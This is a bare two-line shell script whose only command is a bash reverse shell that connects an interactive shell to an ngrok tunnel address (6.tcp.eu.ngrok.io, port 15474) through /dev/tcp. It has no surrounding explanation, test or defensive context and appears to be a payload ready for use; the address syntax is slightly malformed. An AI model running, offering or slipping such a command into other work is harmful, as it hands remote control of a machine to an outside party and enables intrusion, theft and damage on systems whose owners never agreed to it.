#!/bin/sh
bash -i >& /dev/tcp/6.tcp.eu.ngrok.io:15474/8080 0>&1
